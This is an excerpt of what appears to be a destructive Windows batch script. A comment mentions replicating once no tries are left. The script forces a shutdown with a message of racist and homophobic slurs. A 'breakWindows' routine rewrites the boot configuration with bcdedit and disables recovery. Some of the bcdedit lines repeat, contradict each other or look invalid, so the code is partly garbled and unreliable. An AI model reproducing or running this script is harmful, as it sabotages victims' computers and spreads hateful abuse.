...
REM No tries left → replicate and shutdown
echo.
...
REM Ensure shutdown after countdown
shutdown /s /f /t 3 /c "fuck you faggot nigger asshole."
...
:breakWindows
REM Modify the Boot Configuration Data to only show the shutdown option
bcdedit /set {current} bootmenupolicy legacy
bcdedit /set {current} timeout 0
bcdedit /set {current} bootsequence {current}
bcdedit /set {current} bootloaderpath \Windows\System32\winload.exe
bcdedit /set {current} osdevice partition=C:
bcdedit /set {current} path \Windows\System32
bcdedit /set {current} description "Windows Boot Manager"
bcdedit /set {current} locale en-US
bcdedit /set {current} inherit {bootmgr}
bcdedit /set {current} device partition=C:
bcdedit /set {current} ramdisksdidevice partition=C:
bcdedit /set {current} ramdisksdipath \boot\boot.sdi
bcdedit /set {current} nx OptIn
bcdedit /set {current} trampoline OptIn
bcdedit /set {current} bootmenupolicy standard
bcdedit /set {current} recoveryenabled No
bcdedit /set {current} recoverysequence {current}
bcdedit /set {current} recoveryenabled No
bcdedit /set {current} bootmenupolicy legacy
bcdedit /set {current} timeout 0
bcdedit /set {current} bootsequence {current}
